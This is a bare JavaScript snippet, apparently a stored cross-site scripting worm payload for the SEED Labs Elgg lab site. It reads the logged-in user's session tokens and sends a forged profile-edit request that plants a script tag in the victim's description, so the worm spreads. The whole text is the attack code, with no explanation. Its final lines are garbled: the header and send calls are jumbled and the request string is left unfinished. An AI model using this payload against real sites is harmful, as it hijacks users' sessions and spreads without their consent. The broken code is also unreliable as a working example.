<script type="text/javascript">
	window.onload = function(){
		var userName=elgg.session.user.name
		var guid="&guid="+elgg.session.user.guid
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts
		var token="&__elgg_token="+elgg.security.token.__elgg_token

		var sendurl = "http://www.xsslabelgg.com/action/profile/edit"
		var content ="__elgg_token="+token+"&"
		+"__elgg_ts="+ts+"&"
		+"accesslevel[briefdescription]=2&"
		+"accesslevel[contactemail]=2&"
		+"accesslevel[description]="+2+"&"
		+"accesslevel[interests]="+2+"&"
		+"accesslevel[location]="+2+"&"
		+"accesslevel[mobile]="+2+"&"
		+"accesslevel[phone]="+2+"&"
		+"accesslevel[skills]="+2+"&"
		+"accesslevel[twitter]="+2+"&"
		+"accesslevel[website]="+2+"&"
		+"briefdescription="+""+"&"
		+"contactemail="+""+"&"
		+"description="+"<script src='/home/seed/Desktop/attack.js'/>"+"&"
		+"guid="+guid+"&"
		+"interests="+''+"&"
		+"location="+''+"&"
		+"mobile="+''+"&"
		+"name="+userName+"&"
		+"phone="+''+"&"
		+"skills="+''+"&"
		+"twitter="+''+"&"
		+"website="+''+"&"

		var Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",Ajax.send(content);
		"application/x-www-form-urlencoded";
	}
</script>